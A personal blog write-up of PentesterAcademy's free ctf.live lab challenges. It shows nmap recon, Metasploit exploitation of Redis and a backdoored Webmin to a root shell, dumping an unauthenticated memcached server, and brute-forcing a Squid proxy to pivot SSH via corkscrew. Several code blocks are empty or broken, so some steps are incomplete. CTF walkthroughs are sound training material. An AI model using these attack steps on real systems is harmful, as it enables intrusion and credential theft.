Thanks to my early return from an overseas excercise, I'm stuck at home for two weeks. As such, I figured I might as well take a swing at the free CTF put on by PentesterAcademy, [ctf.live](https://www.ctf.live).

# Metasploit

Presumably, all of these challenges involve the use of capabilities provided inside of the Metasploit framework.

## Vulnerable Database
>The target server is running an outdated database server that is vulnerable to a publicly known vulnerability. While making some configuration changes, by mistake the admin has exposed this database to the external machines.
In this challenge, the attacker has to fingerprint the database and exploit it using the appropriate Metasploit module.

Easy enough. My methodology going in will be to banner-grab the database server using _nmap_, then use _searchsploit_ to find the relevant module. From there, I'll pick an appropriate payload to find the flag on the box.

```
root@attackdefense:~# nmap -sV 192.8.72.3
Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-06 23:01 IST
Nmap scan report for target-1 (192.8.72.3)

Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
```

Well, that's unfortunate. It seems every port is closed. The detail oriented, however, will recall that nmap only scans the 1000 most frequently seen ports by default. Since the host did respond to an ICMP ping, it is incredibly unlikely that it is listening on no ports, so I told NMAP to scan all ports (including 0).

```

That's more like it.

Using the _exploit/linux/redis/redis\_unauth\_exec_ module, and the default meterpreter payload, getting the flag is as easy as setting the right options and hitting run.

## Vulnerable CMS
>The target machine is running an outdated Content Management System (CMS) which is vulnerable to a publicly known vulnerability.
In this challenge, the attacker has to fingerprint the CMS and exploit it using the appropriate Metasploit module.

Same as before, my methodology will be to conduct reconaissance, find and weaponize an exploit, and deliver a payload. This time, though, I needed to leverage nmap's scripting engine, using the _-A_ flag to specify to use the default scripts and also perform a banner grab.
```

```

Booting up the Metasploit console, it's trivial to find the right exploit.

## Backdoored System Manager Tool 
>The target server is running a system management tool that contains a publicly known backdoor.
In this challenge, the attacker has to fingerprint the system management tool and exploit it using the appropriate Metasploit module.

Just as you might expect by now, I'll be conducting reconaissance, finding and weaponizing an exploit, then delivering a payload. As before, I'll utilize the nmap scripting engine to fingerprint the tool. One addition is the _-F_ flag, which tells nmap to only scan the top 100 ports, instead of the default top 1000.

```

...
```

Using this exploit, we get a partially-interactive shell, which I then upgrade using the Python pty method.

```
msf5 exploit(linux/http/webmin_backdoor) > set lhost 192.102.234.2
lhost => 192.102.234.2
msf5 exploit(linux/http/webmin_backdoor) > set srvhost 192.102.234.2

...

uid=0(root) gid=0(root) groups=0(root)
python -c 'import pty; pty.spawn("/bin/bash")'

```

Using _find_, I quickly discover where our flag is.
```
root@victim-1:/webmin/acl# find / -xdev -name *flag

##  Vulnerable Web Server 
>The target server is running an outdated web server that is vulnerable to a publicly known vulnerability. 
In this challenge, the attacker has to fingerprint the webserver and then exploit it using the appropriate Metasploit module.

For this challenge, I shouldn't need to do any script scanning, since I'll be directly exploiting the server itself.

##  Vulnerable Search Platform 
>The target server is running an outdated enterprise search platform that is vulnerable to a publicly known vulnerability.
In this challenge, the attacker has to fingerprint the search platform and exploit it using the appropriate Metasploit module.

As always, I'll be using nmap for recon, searching the Metasploit framework for an exploit, then using whatever the exploit's standard payload is.

# Network

All of these challenges involve the indirect exploitation of network facing servers. Sounds fun enough.


## Caching Server
>Over the past years, caching servers have played a crucial role in speeding up the content served by the webservers. In most cases, caching servers are deployed on the internal network and are not protected with authentication.
In this challenge, the attacker has managed to sneak into the internal network and can interact with the caching server.
Please answer the following questions:
> 1. How many key-value pairs are stored on the caching server?
> 2. Find the value stored in key “api-key” on the caching server.
> 3. Find the name of the key which is present in the warm cache of the caching server. 

Off-hand, the references to key-value pairs and different layers of cache make me think that this challenge uses Redis or Memcached, but I will use nmap to confirm this hypothesis.

```

Memcached it is. Luckily for us, _libmemcached_ is installed, as discovered using _apropos_.

memctouch (1)        - libmemcached Documentation
```

Using _memcstat_, getting the total number of pairs is simple.
```
oot@attackdefense:~# memcstat --servers=192.179.78.3
Server: 192.179.78.3 (11211)

	 version: 1.5.12
	 libevent: 2.0.21-stable
...
	 curr_items: 15
	 total_items: 42
...
```

Note that while you might think that _total\_items_ would be the correct answer, only the items in _curr\_items_ are actuall stored on the server right now.

Moving on, I used _memccat_ to get the value for the _api-key_ key.

```
root@attackdefense:~# memccat --servers=192.179.78.3 api-key
0c50e7e8b66421217aa39e2286c2d5df
```

Now, the last question is slightly more tricky. In order to determine which key was in the warm-cache, I connected to the memcached server via telnet and set the timeout of every value to 20 seconds, giving whatever script was keeping the target value warm plenty of time to re-query.
```
set userCount 0 15 1
95
STORED
set email 0 15 23 
admin@recon-badge.local
STORED
...
```

After waiting about a minute, only one key remained:

```
stats cachedump 1 0
ITEM userCount [2 b; 0 s]
END
get userCount
VALUE userCount 4 2
95
```

Counter to the prompt, _95_ is the answer to the question, not the name of the key.


## Abusing Proxy Server
>IP whitelisting is a common method of limiting access only to trusted users.
In this challenge, there are two target machines (machine A and machine B). The attacker is provided with phished SSH credentials of machine B. But, the SSH server is configured only to allow sessions from a specific machine (i.e. machine A).
Objective: You have to SSH into the machine B and retrieve the flag!

Also included further down in the prompt is the following information:
```
You can use corkscrew tool (available on the attacker machine) to solve it
Please use Nmap's proxy brute force script with default Nmap dictionaries (given below):
    Username wordlist: /usr/share/nmap/nselib/data/usernames.lst 
    Password wordlist: /usr/share/nmap/nselib/data/passwords.lst
```

First up, let's figure out what kind of proxy is running on machine A.

```
root@attackdefense:~# nmap -A 192.38.44.3 | tee target-a.txt
Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-07 03:03 IST
Stats: 0:00:23 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Nmap scan report for target-1 (192.38.44.3)
Host is up (0.000051s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE    VERSION
3128/tcp open  http-proxy Squid http proxy 3.5.12
```

Now, using the hinted at _http-proxy-brute_ nmap script, let's brute force that proxy server.

```
root@attackdefense:~# nmap --script=http-proxy-brute -p 3128 192.38.44.3
Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-07 03:07 IST

PORT     STATE SERVICE
3128/tcp open  squid-http
| http-proxy-brute: 
|   Accounts: 
|     root:hello! - Valid credentials
|_  Statistics: Performed 49698 guesses in 38 seconds, average tps: 1644.1
MAC Address: 02:42:C0:26:2C:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 39.16 seconds
```

Now, given that, I'll use _corkscrew_ to SSH to machine B via machine A. Thanks to the following example in the manpage for _corkscrew_, this is easy.

```
EXAMPLES
       The common usage of corkscrew is to put the following line in
       ~/.ssh/ssh_config:

               ProxyCommand corkscrew proxy proxyport %h %p [<path to auth_file>]
```

So, I did the following:

```
root@attackdefense:~# echo "root:hello!" > authfile
root@attackdefense:~# echo "Host *" >> /root/.ssh/ssh_config
root@attackdefense:~# echo "ProxyCommand corkscrew 192.38.44.3 3128 %h %p /root/authfile" >> /root/.ssh/ssh_config
root@attackdefense:~# ssh 192.38.44.4 -F .ssh/ssh_config        
Proxy could not open connection to 192.38.44.4:  Service Unavailable
kex_exchange_identification: Connection closed by remote host
```

Weird. I guess I should probably make sure that the port I'm trying to connect to is actually open.

```
root@attackdefense:~# nmap 192.38.44.4 -p 0-65535 -sV
Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-07 03:17 IST
Nmap scan report for target-2 (192.38.44.4)
Host is up (0.000015s latency).
Not shown: 65535 closed ports
PORT     STATE SERVICE VERSION
4554/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.5 (Ubuntu Linux; protocol 2.0)
```

Okay, so they set SSH to listen on port 4554. Easy enough:

```
root@attackdefense:~# ssh 192.38.44.4 -F .ssh/ssh_config -p 4554
root@192.38.44.4's password:

# Conclusion
While that's all I had time to do in a day, there's a bunch more challenges up on the site. This CTF, which it seems is based on the Attack-Defense CTF I beta tested, is well-built and has minimal issues. Thanks to the in-browser VMs, you could concievably do this on any network that lets you browse the internet, and on any device that can run a web browser, which is always a plus. My impression of Pentester Academy only goes up as I interact with more of their products. Who knows, if I decide I want to move into the offensive security space I may purchase a subscription.
